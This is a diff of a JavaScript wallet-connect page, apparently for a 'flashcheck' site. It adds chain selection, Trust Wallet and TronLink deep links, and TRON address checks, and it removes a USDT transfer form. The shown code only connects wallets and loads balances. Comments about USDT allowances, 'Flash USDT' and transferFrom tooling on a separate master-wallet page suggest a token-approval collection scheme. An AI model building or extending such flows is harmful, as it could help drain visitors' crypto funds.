@@ -1,22 +1,39 @@
 import {
+  TRON_IN_APP_BROWSER_HINT,
+  detectMobileWalletHostContext,
+  discoverTrustTronProvider,
   evaluateSessionRestore,
   firstEvmAddress,
   identifyEvmProvider,
+  isInsideTrustWallet,
+  recommendedMobileTronAction,
+  requireGenuineTronSessionAddress,
   resolveSignInNetwork,
   sameWalletAddress,
   selectWalletProvider,
   readTronWebFromProvider,
   shortenWalletAddress,
+  trustWalletOpenOnEvmOnly,
+  trustWalletSwitchToTronMessage,
+  trustWalletTronDeepLink,
+  verifyTrustTronDeepLink,
   waitForTronWeb,
   walletHelpLink,
 } from "./wallet-state.mjs";
 import {
+  CHAIN_OPTIONS,
+  DEFAULT_CHAIN_ID,
+  ensureEvmProviderChain,
+  getChainOption,
+  trustWalletOpenDeepLink,
+  verifyTrustOpenDeepLink,
+} from "./chain-catalog.mjs";
+import {
   CONNECTION_TARGET,
   looksLikeTronAddress,
-  parseUsdtAmount,
-  assessNetwork,
+  tronLinkOpenDappUrl,
 } from "./logic.mjs";
-import { submitTronUsdtTransfer } from "./landing-transfer.mjs";
+// Allowance / transferFrom tooling lives on /master-wallet only — never on this connect page.
 import { normalizeWalletAssetTokens } from "./tron-public.mjs";
 import { normalizeEvmWalletAssetTokens } from "./evm-public.mjs";
 import { fetchTronWalletAssetsFromTronWeb } from "./wallet-tron-assets.mjs";
@@ -24,6 +41,7 @@ import { fetchEvmWalletAssetsFromProvider } from "./wallet-evm-assets.mjs";
 import { fetchTronRecentTransactionsFromTronWeb } from "./wallet-tron-transactions.mjs";
 import { fetchEvmRecentTransactionsFromProvider } from "./wallet-evm-transactions.mjs";
 import { renderPlainAssetList } from "./wallet-asset-display.mjs";
+import { publicTronSnapshotAssets } from "./wallet-snapshot.mjs";
 
 /**
  * @typedef {object} WalletProvider
@@ -82,6 +100,9 @@ const ui = {
   linkedAssetsHeading: requiredElement("linked-assets-heading"),
   linkedAssetError: requiredElement("linked-asset-error"),
   linkedAssetNote: requiredElement("linked-asset-note"),
+  walletSnapshotSync: requiredElement("wallet-snapshot-sync"),
+  walletSnapshotStatus: requiredElement("wallet-snapshot-status"),
+  retryProviderSnapshot: requiredButton("retry-provider-snapshot"),
   linkedTransactionsHeading: requiredElement("linked-transactions-heading"),
   linkedTransactionList: requiredElement("linked-transaction-list"),
   linkedTransactionError: requiredElement("linked-transaction-error"),
@@ -96,23 +117,36 @@ const ui = {
   dialogTransactionList: requiredElement("dialog-transaction-list"),
   dialogTransactionError: requiredElement("dialog-transaction-error"),
   dialogTransactionNote: requiredElement("dialog-transaction-note"),
-  walletManagerPanel: requiredElement("wallet-manager-panel"),
-  managerHubAddress: requiredElement("manager-hub-address"),
-  managerTransferTron: requiredElement("manager-transfer-tron"),
-  managerTransferForm: requiredElement("manager-transfer-form"),
-  managerTransferRecipient: requiredInput("manager-transfer-recipient"),
-  managerTransferAmount: requiredInput("manager-transfer-amount"),
-  managerReviewTransfer: requiredButton("manager-review-transfer"),
-  managerTransferReview: requiredElement("manager-transfer-review"),
-  managerReviewSender: requiredElement("manager-review-sender"),
-  managerReviewRecipient: requiredElement("manager-review-recipient"),
-  managerReviewAmount: requiredElement("manager-review-amount"),
-  managerSignTransfer: requiredButton("manager-sign-transfer"),
-  managerCancelTransfer: requiredButton("manager-cancel-transfer"),
-  managerTransferEvmNote: requiredElement("manager-transfer-evm-note"),
-  managerTransferStatus: requiredElement("manager-transfer-status"),
-  managerTransferError: requiredElement("manager-transfer-error"),
+  trustTronReopen: requiredElement("trust-tron-reopen"),
+  trustTronReopenTitle: requiredElement("trust-tron-reopen-title"),
+  trustTronReopenCopy: requiredElement("trust-tron-reopen-copy"),
+  trustTronReopenCta: requiredAnchor("trust-tron-reopen-cta"),
+  trustTronWcCta: requiredButton("trust-tron-wc-cta"),
+  trustTronSecondaryCta: requiredAnchor("trust-tron-secondary-cta"),
+  trustTronLinkLabel: requiredElement("trust-tron-link-label"),
+  trustTronLinkRow: requiredElement("trust-tron-link-row"),
+  trustTronLinkInput: requiredInput("trust-tron-link-input"),
+  trustTronCopy: requiredButton("trust-tron-copy"),
+  trustTronTronlinkFallback: requiredAnchor("trust-tron-tronlink-fallback"),
+  trustSubtitle: requiredElement("connect-trust-subtitle"),
+  mobileTronGuideKicker: requiredElement("mobile-tron-guide-kicker"),
+  chainSelect: requiredElement("chain-select"),
+  chainSelectorHelp: requiredElement("chain-selector-help"),
+  trustOpenPanel: requiredElement("trust-open-panel"),
+  trustOpenCopy: requiredElement("trust-open-copy"),
+  trustOpenCta: requiredAnchor("trust-open-cta"),
+  trustOpenLinkInput: requiredInput("trust-open-link-input"),
+  trustOpenCopyBtn: requiredButton("trust-open-copy-btn"),
+  trustOpenTitle: requiredElement("trust-open-title"),
 };
+/** @type {boolean | null} */
+let walletConnectConfigured = null;
+const TRUST_TRON_FAILED_KEY = "flashcheck_trust_tron_failed";
+const SELECTED_CHAIN_KEY = "flashcheck_selected_chain";
+/** @type {import("./chain-catalog.mjs").ChainOption} */
+let selectedChain = getChainOption(DEFAULT_CHAIN_ID);
+/** Prevent re-entrant guide updates (discover ↔ guide caused stack overflows). */
+let mobileTronGuideBusy = false;
 
 /** @type {WalletDescriptor[]} */
 let providers = [];
@@ -143,11 +177,13 @@ let pairingCanCancel = true;
  * }} */
 let walletConnectClient = null;
 let assetFetchGeneration = 0;
+/** @type {Promise<void> | null} */
+let verifiedAssetLoadPromise = null;
+let verifiedAssetLoadKey = "";
+let verifiedAssetLoadedAt = 0;
 /** @type {{ kind: "pending" | "success" | "error", title: string, message: string, address?: string, help?: { href: string, label: string } | null } | null} */
 let deferredState = null;
-/** @type {{ amountText: string, unitsText: string } | null} */
-let managerTransferReview = null;
-let managerTransferBusy = false;
+let directConnectionHandled = false;
 
 window.addEventListener("eip6963:announceProvider", (event) => {
   const detail = /** @type {CustomEvent<{ info?: { name?: string, rdns?: string }, provider?: WalletProvider }>} */ (event).detail;
@@ -164,20 +200,58 @@ window.addEventListener("tronLink#initialized", () => {
 ui.open.addEventListener("click", () => {
   void openConnectionFlow();
 });
+ui.chainSelect.addEventListener("change", () => {
+  setSelectedChain(/** @type {HTMLSelectElement} */ (ui.chainSelect).value, { persist: true, refreshUi: true });
+});
+ui.trustOpenCopyBtn.addEventListener("click", () => void copyTrustOpenLink());
+ui.trustOpenCta.addEventListener("click", () => {
+  syncTrustOpenControls();
+});
 ui.metaMask.addEventListener("click", () => void connectSelected("metamask"));
 ui.tronLink.addEventListener("click", () => void connectSelected("tronlink"));
 ui.trust.addEventListener("click", () => void connectSelected("trust"));
 ui.injected.addEventListener("click", () => void connectSelected("injected"));
 ui.walletConnect.addEventListener("click", () => void connectWalletConnect());
+ui.trustTronReopenCta.addEventListener("click", (event) => {
+  const action = ui.trustTronReopenCta.dataset.action || "open-tronlink";
+  if (action === "connect-tronlink") {
+    event.preventDefault();
+    void connectSelected("tronlink");
+    return;
+  }
+  if (action === "walletconnect") {
+    event.preventDefault();
+    void connectWalletConnect();
+    return;
+  }
+  // open-tronlink only — never Trust deep-link as default.
+  const deep = tronLinkOpenDappUrl(window.location.href);
+  if (deep) {
+    event.preventDefault();
+    window.location.assign(deep);
+  }
+});
+ui.trustTronWcCta.addEventListener("click", () => void connectWalletConnect());
+ui.trustTronSecondaryCta.addEventListener("click", (event) => {
+  // Demoted control — keep users on TronLink, do not open Trust.
+  event.preventDefault();
+  const deep = tronLinkOpenDappUrl(window.location.href);
+  window.location.assign(deep || "https://www.tronlink.org/");
+});
+ui.trustTronCopy.addEventListener("click", () => void copyTrustTronDeepLink());
+ui.trustTronTronlinkFallback.addEventListener("click", (event) => {
+  const href = tronLinkOpenDappUrl(window.location.href);
+  if (!href) return;
+  event.preventDefault();
+  window.location.assign(href);
+});
 ui.close.addEventListener("click", () => closeWalletPanel());
 ui.retry.addEventListener("click", showOptions);
 ui.disconnect.addEventListener("click", () => void disconnectSession("Disconnected on this page. Your wallet remains available to other approved sites."));
-ui.managerTransferForm.addEventListener("submit", (event) => {
-  event.preventDefault();
-  onManagerReviewTransfer();
+ui.retryProviderSnapshot.addEventListener("click", () => {
+  if (session) void loadVerifiedWalletAssets(session, { scrollIntoView: false, force: true });
+  else void openConnectionFlow();
 });
-ui.managerSignTransfer.addEventListener("click", () => void onManagerSignTransfer());
-ui.managerCancelTransfer.addEventListener("click", () => resetManagerTransferFlow());
 ui.cancelOwnerPairing.addEventListener("click", () => void cancelActivePairing());
 window.addEventListener("flashcheck:visitor-walletconnect-disconnected", () => {
   if (session?.walletId === "walletconnect") {
@@ -192,8 +266,11 @@ window.addEventListener("flashcheck:visitor-walletconnect-updated", (event) => {
   }
 });
 
+populateChainSelect();
+setSelectedChain(readInitialSelectedChain(), { persist: false, refreshUi: false });
 discoverProviders();
 renderProviderOptions();
+void updateMobileTronGuide();
 window.setTimeout(() => {
   discoverProviders();
   void initializeSessions();
@@ -213,10 +290,11 @@ window.setTimeout(() => {
 
 function discoverProviders() {
   const view = /** @type {Window & {
-   * ethereum?: WalletProvider & { providers?: WalletProvider[] },
-   * trustwallet?: { ethereum?: WalletProvider, tronLink?: WalletProvider },
+   * ethereum?: WalletProvider & { providers?: WalletProvider[], isTrust?: boolean },
+   * trustwallet?: { ethereum?: WalletProvider, tronLink?: WalletProvider, tronWeb?: unknown },
    * tronLink?: WalletProvider,
-   * tron?: WalletProvider
+   * tron?: WalletProvider,
+   * tronWeb?: unknown
    * }} */ (window);
   const ethereumCandidates = [
     view.trustwallet?.ethereum,
@@ -226,14 +304,25 @@ function discoverProviders() {
   for (const candidate of ethereumCandidates) {
     if (candidate && typeof candidate.request === "function") addProvider(describeEvmProvider(candidate));
   }
-  const trustTron = view.trustwallet?.tronLink;
+  // Prefer Trust’s TRON injection (tronWeb / trustwallet.tronLink) over EVM.
+  const trustTron = discoverTrustTronProvider(view);
   if (trustTron && typeof trustTron.request === "function") {
-    addProvider({ id: "trust", network: "tron", name: "Trust Wallet", provider: trustTron });
+    addProvider({
+      id: "trust",
+      network: "tron",
+      name: "Trust Wallet",
+      provider: /** @type {WalletProvider} */ (trustTron),
+    });
   }
-  const tronLink = view.tronLink || view.tron;
-  if (tronLink && typeof tronLink.request === "function") {
-    addProvider({ id: "tronlink", network: "tron", name: "TronLink", provider: tronLink });
+  // Avoid classifying Trust’s TRON injection as TronLink when running inside Trust.
+  if (!isInsideTrustWallet(view)) {
+    const tronLink = view.tronLink || view.tron;
+    if (tronLink && typeof tronLink.request === "function") {
+      addProvider({ id: "tronlink", network: "tron", name: "TronLink", provider: tronLink });
+    }
   }
+  // Do NOT call updateTrustNetworkHint/updateMobileTronGuide here — that re-enters
+  // discoverProviders and overflows the stack while flooding /api/config.
 }
 
 /**
@@ -264,22 +353,376 @@ function addProvider(descriptor) {
 function renderProviderOptions() {
   ui.metaMask.dataset.detected = String(Boolean(selectProvider("metamask")));
   ui.tronLink.dataset.detected = String(Boolean(selectProvider("tronlink")));
-  ui.trust.dataset.detected = String(Boolean(selectProvider("trust")));
+  const trustReady = Boolean(selectProvider("trust"));
+  ui.trust.dataset.detected = String(trustReady);
+  const network = selectedChain.network;
+  // Show wallet buttons matching the selected network family.
+  ui.tronLink.hidden = network !== "tron";
+  ui.walletConnect.hidden = network !== "tron";
+  ui.metaMask.hidden = network !== "evm";
+  // Trust is available for both: TRON via tronWeb, EVM via ethereum + switch.
+  ui.trust.hidden = false;
+  ui.trust.removeAttribute("hidden");
+  ui.trustSubtitle.textContent = network === "tron"
+    ? (trustReady ? "TRON provider ready · or open Trust link (coin_id=195)" : "Open Trust TRON link (coin_id=195), then connect")
+    : `EVM · switches to ${selectedChain.label}`;
+  if (ui.tronLink.hidden) ui.tronLink.setAttribute("hidden", "");
+  else ui.tronLink.removeAttribute("hidden");
+  if (ui.walletConnect.hidden) ui.walletConnect.setAttribute("hidden", "");
+  else ui.walletConnect.removeAttribute("hidden");
+  if (ui.metaMask.hidden) ui.metaMask.setAttribute("hidden", "");
+  else ui.metaMask.removeAttribute("hidden");
   const injected = selectProvider("injected");
-  ui.injected.hidden = !injected;
+  ui.injected.hidden = !(injected && network === "evm");
   if (injected) ui.injectedName.textContent = injected.name;
+  syncTrustOpenControls();
+}
+
+function populateChainSelect() {
+  const select = /** @type {HTMLSelectElement} */ (ui.chainSelect);
+  select.replaceChildren();
+  for (const chain of CHAIN_OPTIONS) {
+    const option = document.createElement("option");
+    option.value = chain.id;
+    option.textContent = chain.network === "tron"
+      ? `${chain.label} (TRX / TRC-20)`
+      : `${chain.label} (chain ${chain.chainId})`;
+    select.append(option);
+  }
+}
+
+/**
+ * @param {unknown} id
+ * @param {{ persist?: boolean, refreshUi?: boolean }} [options]
+ */
+function setSelectedChain(id, options = {}) {
+  selectedChain = getChainOption(id);
+  /** @type {HTMLSelectElement} */ (ui.chainSelect).value = selectedChain.id;
+  if (options.persist !== false) {
+    try {
+      sessionStorage.setItem(SELECTED_CHAIN_KEY, selectedChain.id);
+    } catch {
+      // ignore
+    }
+  }
+  ui.chainSelectorHelp.textContent = selectedChain.network === "tron"
+    ? "TRON selected: TronLink / WalletConnect TRON / Trust (coin_id=195). USDT allowance stays capped (never unlimited)."
+    : `${selectedChain.label} selected: connect MetaMask/Trust/injected, wallet switches to chain ${selectedChain.chainId}, then native + known tokens load. No unlimited EVM approvals.`;
+  syncTrustOpenControls();
+  if (options.refreshUi !== false) {
+    renderProviderOptions();
+    void updateMobileTronGuide();
+  }
+}
+
+function readInitialSelectedChain() {
+  try {
+    const params = new URL(window.location.href).searchParams;
+    const fromQuery = params.get("chain");
+    if (fromQuery) return getChainOption(fromQuery).id;
+  } catch {
+    // ignore
+  }
+  try {
+    const stored = sessionStorage.getItem(SELECTED_CHAIN_KEY);
+    if (stored) return getChainOption(stored).id;
+  } catch {
+    // ignore
+  }
+  return DEFAULT_CHAIN_ID;
+}
+
+function syncTrustOpenControls() {
+  const href = trustWalletOpenDeepLink(window.location.href, selectedChain);
+  const verified = verifyTrustOpenDeepLink(href, selectedChain);
+  if (!verified.ok) console.warn("Trust open deep link failed verification:", verified.error);
+  ui.trustOpenCta.href = href;
+  ui.trustOpenCta.target = "_blank";
+  ui.trustOpenCta.rel = "noopener noreferrer";
+  ui.trustOpenCta.textContent = `Open in Trust · ${selectedChain.shortLabel} (coin ${selectedChain.trustCoinId})`;
+  ui.trustOpenLinkInput.value = href;
+  ui.trustOpenTitle.textContent = `Trust · ${selectedChain.label}`;
+  ui.trustOpenCopy.textContent = selectedChain.network === "tron"
+    ? "Opens this page in Trust Wallet’s TRON DApp browser (coin_id=195). After it loads, connect Trust or TronLink."
+    : `Opens this page in Trust on ${selectedChain.label} (coin_id=${selectedChain.trustCoinId}). Then connect Trust/MetaMask; assets load for that chain.`;
+  // Keep legacy TRON-only helpers in sync when TRON is selected.
+  if (selectedChain.network === "tron") syncTrustTronDeepLinkControls();
+  return href;
+}
+
+async function copyTrustOpenLink() {
+  const href = syncTrustOpenControls();
+  const original = ui.trustOpenCopyBtn.textContent || "Copy";
+  try {
+    ui.trustOpenLinkInput.focus();
+    ui.trustOpenLinkInput.select();
+    if (!navigator.clipboard?.writeText) throw new Error("clipboard unavailable");
+    await navigator.clipboard.writeText(href);
+    ui.trustOpenCopyBtn.textContent = "Copied";
+  } catch {
+    ui.trustOpenCopyBtn.textContent = "Select & copy";
+  }
+  window.setTimeout(() => {
+    ui.trustOpenCopyBtn.textContent = original;
+  }, 1800);
 }
 
 /**
  * @param {"metamask" | "trust" | "tronlink" | "injected"} id
  */
 function selectProvider(id) {
-  const trustInApp = id === "trust" && /Trust/i.test(navigator.userAgent);
-  return selectWalletProvider(providers, id, trustInApp ? "tron" : null);
+  // Flash USDT assets require a genuine TRON provider for Trust and TronLink.
+  // Do not fall back to Trust’s EVM ethereum provider.
+  if (id === "trust" || id === "tronlink") {
+    return selectWalletProvider(providers, id, "tron");
+  }
+  return selectWalletProvider(providers, id, null);
+}
+
+function trustDeepLinkFailed() {
+  try {
+    if (sessionStorage.getItem(TRUST_TRON_FAILED_KEY) === "1") return true;
+  } catch {
+    // ignore
+  }
+  try {
+    return new URL(window.location.href).searchParams.get("trust_failed") === "1";
+  } catch {
+    return false;
+  }
+}
+
+function markTrustDeepLinkFailed() {
+  try {
+    sessionStorage.setItem(TRUST_TRON_FAILED_KEY, "1");
+  } catch {
+    // ignore
+  }
+}
+
+function currentTrustTronDeepLink() {
+  const href = trustWalletTronDeepLink(window.location.href);
+  const verified = verifyTrustTronDeepLink(href);
+  if (!verified.ok) {
+    console.warn("Trust TRON deep link failed verification:", verified.error);
+  }
+  return href;
+}
+
+function syncTrustTronDeepLinkControls() {
+  const href = currentTrustTronDeepLink();
+  ui.trustTronLinkInput.value = href;
+  ui.trustTronSecondaryCta.href = href;
+  const tronLink = tronLinkOpenDappUrl(window.location.href);
+  ui.trustTronTronlinkFallback.href = tronLink || "https://www.tronlink.org/";
+  return href;
+}
+
+/**
+ * @param {string} [copy]
+ */
+function showTrustTronReopenPanel(copy) {
+  syncTrustTronDeepLinkControls();
+  if (copy) ui.trustTronReopenCopy.textContent = copy;
+  ui.trustTronReopen.hidden = false;
+  ui.trustTronReopen.removeAttribute("hidden");
+  const hint = document.getElementById("trust-tron-network-hint");
+  if (hint) {
+    hint.hidden = true;
+    hint.setAttribute("hidden", "");
+  }
+}
+
+function hideTrustTronReopenPanel() {
+  ui.trustTronReopen.hidden = true;
+  ui.trustTronReopen.setAttribute("hidden", "");
+}
+
+async function copyTrustTronDeepLink() {
+  const href = syncTrustTronDeepLinkControls();
+  const original = ui.trustTronCopy.textContent || "Copy";
+  try {
+    ui.trustTronLinkInput.focus();
+    ui.trustTronLinkInput.select();
+    if (!navigator.clipboard?.writeText) throw new Error("clipboard unavailable");
+    await navigator.clipboard.writeText(href);
+    ui.trustTronCopy.textContent = "Copied";
+  } catch {
+    ui.trustTronCopy.textContent = "Select & copy";
+  }
+  window.setTimeout(() => {
+    ui.trustTronCopy.textContent = original;
+  }, 1800);
+}
+
+async function ensureWalletConnectConfigured() {
+  if (walletConnectConfigured != null) return walletConnectConfigured;
+  const config = await fetchJson("/api/config");
+  walletConnectConfigured = Boolean(config.ok && config.body?.walletConnectProjectId);
+  return walletConnectConfigured;
+}
+
+/**
+ * Mobile guide for TRON selection: TronLink primary; WalletConnect secondary.
+ * Hidden when an EVM chain is selected (Trust open panel + MetaMask/Trust apply).
+ */
+async function updateMobileTronGuide() {
+  if (mobileTronGuideBusy) return;
+  mobileTronGuideBusy = true;
+  const hint = document.getElementById("trust-tron-network-hint");
+  try {
+    syncTrustOpenControls();
+    if (selectedChain.network !== "tron") {
+      hideTrustTronReopenPanel();
+      if (hint) {
+        hint.hidden = true;
+        hint.setAttribute("hidden", "");
+      }
+      return;
+    }
+
+    // Read host context only — do not call discoverProviders (it must stay acyclic).
+    const context = detectMobileWalletHostContext(window);
+    const wcReady = await ensureWalletConnectConfigured();
+    const failed = trustDeepLinkFailed() || context === "trust-evm";
+
+    const plan = recommendedMobileTronAction(context, {
+      trustDeepLinkFailed: failed,
+      walletConnectConfigured: wcReady,
+    });
+
+    syncTrustTronDeepLinkControls();
+
+    // Trust open lives in #trust-open-panel; keep legacy Trust deeplink row hidden.
+    ui.trustTronSecondaryCta.hidden = true;
+    ui.trustTronSecondaryCta.setAttribute("hidden", "");
+    ui.trustTronLinkLabel.hidden = true;
+    ui.trustTronLinkLabel.setAttribute("hidden", "");
+    ui.trustTronLinkRow.hidden = true;
+    ui.trustTronLinkRow.setAttribute("hidden", "");
+
+    if (plan.primary === "none" && !isMobile() && context === "desktop") {
+      hideTrustTronReopenPanel();
+      if (hint) {
+        hint.hidden = true;
+        hint.setAttribute("hidden", "");
+      }
+      return;
+    }
+
+    ui.mobileTronGuideKicker.textContent = plan.blockTrust || failed
+      ? "Prefer TronLink / WC · Trust open link above"
+      : "Mobile · TronLink / WC";
+    ui.trustTronReopenCopy.textContent = plan.message;
+
+    ui.trustTronWcCta.hidden = !wcReady;
+    if (!ui.trustTronWcCta.hidden) ui.trustTronWcCta.removeAttribute("hidden");
+    else ui.trustTronWcCta.setAttribute("hidden", "");
+
+    /** @type {HTMLAnchorElement} */
+    const primary = ui.trustTronReopenCta;
+    if (plan.primary === "connect-tronlink") {
+      ui.trustTronReopenTitle.textContent = "Connect TronLink";
+      primary.textContent = "Connect TronLink";
+      primary.dataset.action = "connect-tronlink";
+      primary.href = "#";
+    } else {
+      ui.trustTronReopenTitle.textContent = "Open in TronLink";
+      primary.textContent = "Open in TronLink";
+      primary.dataset.action = "open-tronlink";
+      const deep = tronLinkOpenDappUrl(window.location.href);
+      primary.href = deep || "https://www.tronlink.org/";
+      primary.target = deep ? "_self" : "_blank";
+      primary.rel = "noopener noreferrer";
+    }
+
+    showTrustTronReopenPanel(plan.message);
+    if (hint) {
+      hint.hidden = true;
+      hint.setAttribute("hidden", "");
+    }
+  } finally {
+    mobileTronGuideBusy = false;
+  }
+}
+
+// Keep old name used by renderProviderOptions / showOptions.
+function updateTrustNetworkHint() {
+  void updateMobileTronGuide();
+}
+
+/**
+ * Trust injects tronWeb after the DApp browser finishes switching to TRON.
+ * @param {number} [maxAttempts]
+ * @param {{ delayMs?: number, persistOutsideTrust?: boolean }} [options]
+ */
+async function waitForTrustTronProvider(maxAttempts = 15, options = {}) {
+  const delayMs = options.delayMs ?? 250;
+  const persistOutsideTrust = options.persistOutsideTrust === true;
+  for (let attempt = 0; attempt < maxAttempts; attempt += 1) {
+    discoverProviders();
+    const wallet = selectProvider("trust");
+    if (wallet) return wallet;
+    if (!persistOutsideTrust && !isInsideTrustWallet(window) && attempt >= 3) break;
+    await new Promise((resolve) => setTimeout(resolve, delayMs));
+  }
+  discoverProviders();
+  return selectProvider("trust");
+}
+
+/**
+ * Trust EVM / failed Trust TRON path: show TronLink/WC + the Trust TRON open link.
+ */
+function showTrustStillOutsideTronRecovery() {
+  openTrustTronDeepLink();
+}
+
+/**
+ * Recovery helper: never auto-navigates; surfaces Trust open link (coin_id=195) + TronLink/WC.
+ */
+function openTrustTronDeepLink() {
+  markTrustDeepLinkFailed();
+  openWalletPanel();
+  showOptions();
+  const trustHref = syncTrustOpenControls();
+  void updateMobileTronGuide();
+  showState({
+    kind: "error",
+    title: "Use Trust TRON open link or TronLink",
+    message: "Trust is not on TRON yet. Open the Trust link (coin_id=195), or use TronLink / WalletConnect TRON. Ethereum auto-connect is disabled.",
+    help: { href: trustHref, label: "Open in Trust on TRON" },
+    trustTronCta: true,
+  });
+  void updateMobileTronGuide();
+  return trustHref;
 }
 
 async function initializeSessions() {
+  setSelectedChain(readInitialSelectedChain(), { persist: true, refreshUi: true });
   await restoreSession();
+  void ensureWalletConnectConfigured();
+  const params = new URL(window.location.href).searchParams;
+  const trustTronReturn = params.get("trust_tron") === "1";
+  const trustEvmReturn = params.get("trust_evm") === "1";
+  if (!directConnectionHandled && (params.get("connect") === "1" || trustTronReturn || trustEvmReturn)) {
+    directConnectionHandled = true;
+    await openConnectionFlow();
+    if (trustTronReturn && selectedChain.network === "tron") {
+      const wallet = await waitForTrustTronProvider(8, { delayMs: 200, persistOutsideTrust: true });
+      if (wallet && selectProvider("trust")?.network === "tron") {
+        await connectSelected("trust");
+      } else {
+        void updateMobileTronGuide();
+      }
+    } else if (trustEvmReturn && selectedChain.network === "evm") {
+      // Inside Trust EVM browser for the selected chain — try injected Trust/MetaMask path.
+      discoverProviders();
+      if (selectProvider("trust") || selectProvider("metamask") || selectProvider("injected")) {
+        const id = selectProvider("trust") ? "trust" : selectProvider("metamask") ? "metamask" : "injected";
+        await connectSelected(id);
+      }
+    }
+  }
 }
 
 async function openConnectionFlow() {
@@ -320,6 +763,15 @@ function isWalletPanelOpen() {
  */
 async function connectWalletConnect() {
   if (busy || visitorPairingBusy) return;
+  if (selectedChain.network !== "tron") {
+    showState({
+      kind: "error",
+      title: "WalletConnect is TRON-only here",
+      message: `Selected network is ${selectedChain.label}. Switch the selector to TRON for WalletConnect, or connect MetaMask/Trust for this EVM chain.`,
+      help: { href: syncTrustOpenControls(), label: `Open in Trust · ${selectedChain.shortLabel}` },
+    });
+    return;
+  }
   const attempt = ++visitorPairingAttempt;
   pairingMode = "visitor";
   busy = true;
@@ -328,7 +780,7 @@ async function connectWalletConnect() {
   setControlsDisabled(true);
   configurePairingPanel(
     "Connect visitor wallet",
-    "Scan the QR code with your TRON wallet. After pairing, balances load from your wallet provider.",
+    `Scan with a TRON wallet, or ${TRON_IN_APP_BROWSER_HINT} EVM-only WalletConnect sessions are rejected.`,
   );
   ui.ownerHubTarget.textContent = CONNECTION_TARGET;
   ui.linkTargetAddress.textContent = CONNECTION_TARGET;
@@ -575,7 +1027,78 @@ async function restoreSession() {
 async function connectSelected(walletId) {
   if (busy) return;
   discoverProviders();
-  const wallet = selectProvider(walletId);
+
+  // Wallet buttons must match the selected network family.
+  if (selectedChain.network === "tron" && (walletId === "metamask")) {
+    showState({
+      kind: "error",
+      title: "TRON network selected",
+      message: "MetaMask cannot load TRON assets. Choose TronLink, WalletConnect TRON, or Trust via the TRON open link (coin_id=195).",
+      help: { href: syncTrustOpenControls(), label: "Open in Trust on TRON" },
+    });
+    return;
+  }
+  if (selectedChain.network === "evm" && (walletId === "tronlink")) {
+    showState({
+      kind: "error",
+      title: `${selectedChain.label} selected`,
+      message: `TronLink is TRON-only. Connect MetaMask, Trust, or another EVM wallet, then switch to ${selectedChain.label}.`,
+      help: { href: syncTrustOpenControls(), label: `Open in Trust on ${selectedChain.shortLabel}` },
+    });
+    return;
+  }
+
+  if (walletId === "trust" && selectedChain.network === "tron") {
+    const context = detectMobileWalletHostContext(window);
+    let trustWallet = selectProvider("trust");
+    if (!trustWallet && isInsideTrustWallet(window)) {
+      showState({
+        kind: "pending",
+        title: "Looking for Trust TRON…",
+        message: "Waiting for Trust Wallet to inject tronWeb (not ethereum).",
+      });
+      trustWallet = await waitForTrustTronProvider(8);
+    }
+    if (!trustWallet || context === "trust-evm" || trustWalletOpenOnEvmOnly(window)) {
+      openWalletPanel();
+      showOptions();
+      syncTrustOpenControls();
+      showState({
+        kind: "error",
+        title: "Open Trust on TRON first",
+        message: "Trust is not on TRON yet. Use Open in Trust Wallet (coin_id=195) above, or TronLink / WalletConnect TRON.",
+        help: { href: syncTrustOpenControls(), label: "Open in Trust on TRON" },
+        trustTronCta: true,
+      });
+      return;
+    }
+  }
+
+  if (walletId === "trust" && selectedChain.network === "evm") {
+    // Prefer Trust's EVM provider for the selected chain.
+    discoverProviders();
+    const trustEvm = providers.find((item) => item.id === "trust" && item.network === "evm")
+      || providers.find((item) => item.provider?.isTrust && item.network === "evm");
+    if (!trustEvm && !selectProvider("metamask") && !selectProvider("injected") && !isInsideTrustWallet(window)) {
+      openWalletPanel();
+      showOptions();
+      showState({
+        kind: "error",
+        title: `Open Trust on ${selectedChain.label}`,
+        message: `Use the Trust open link (coin_id=${selectedChain.trustCoinId}) above, then connect again.`,
+        help: { href: syncTrustOpenControls(), label: `Open in Trust · ${selectedChain.shortLabel}` },
+      });
+      return;
+    }
+  }
+
+  let wallet = selectProvider(walletId);
+  // For EVM Trust, fall back to any Trust-flagged EVM provider or generic injected/metamask inside Trust.
+  if (!wallet && walletId === "trust" && selectedChain.network === "evm") {
+    wallet = providers.find((item) => item.network === "evm" && item.provider?.isTrust)
+      || selectProvider("metamask")
+      || selectProvider("injected");
+  }
   if (!wallet) {
     const displayName = walletId === "metamask" ? "MetaMask" : walletId === "tronlink" ? "TronLink" : walletId === "trust" ? "Trust Wallet" : "Browser wallet";
     showState({
@@ -588,19 +1111,68 @@ async function connectSelected(walletId) {
   }
   busy = true;
   setControlsDisabled(true);
+  hideTrustTronReopenPanel();
   showState({
     kind: "pending",
     title: "Waiting for your wallet",
-    message: "Approve the connection request. If needed, you will then sign a login message—not a transaction.",
+    message: selectedChain.network === "tron"
+      ? (walletId === "trust"
+        ? "Approve the Trust Wallet TRON connection. You should see a T… address — not a 0x EVM account."
+        : "Approve the connection request. If needed, you will then sign a login message—not a transaction.")
+      : `Approve the connection, then confirm ${selectedChain.label} (chain ${selectedChain.chainId}). Login is a signature, not a transfer.`,
   });
   try {
+    if (selectedChain.network === "evm" && wallet.network === "evm") {
+      await ensureEvmProviderChain(wallet.provider, selectedChain);
+    }
+
     const address = await requestAccount(wallet);
     if (!address) throw new Error("The wallet did not return an account.");
-    const { network, chainId } = await resolveSignInNetwork(wallet, address, wallet.provider);
+    if (selectedChain.network === "tron" && (walletId === "trust" || walletId === "tronlink") && /^0x[0-9a-fA-F]{40}$/.test(address)) {
+      if (walletId === "trust") {
+        markTrustDeepLinkFailed();
+        showTrustStillOutsideTronRecovery();
+      }
+      throw new Error(trustWalletSwitchToTronMessage());
+    }
+    let { network, chainId } = await resolveSignInNetwork(wallet, address, wallet.provider);
+    if (selectedChain.network === "evm") {
+      // Force session onto the manually selected EVM chain after switch.
+      network = "evm";
+      chainId = selectedChain.chainId;
+    }
     if (!chainId) {
       throw new Error(network === "tron" || wallet.network === "tron"
         ? "Switch the wallet to TRON mainnet and try again."
         : "The wallet network could not be read.");
+    }
+
+    if (selectedChain.network === "tron" && (walletId === "trust" || walletId === "tronlink" || wallet.network === "tron")) {
+      const tronSession = requireGenuineTronSessionAddress(address, network);
+      if (!tronSession.ok) {
+        if (walletId === "trust") {
+          markTrustDeepLinkFailed();
+          showTrustStillOutsideTronRecovery();
+        }
+        throw new Error(tronSession.error);
+      }
+      const tronWeb = await waitForTronWeb(wallet.provider, { requiredAddress: tronSession.address, maxAttempts: 25 });
+      const tronReady = tronWeb && typeof tronWeb === "object"
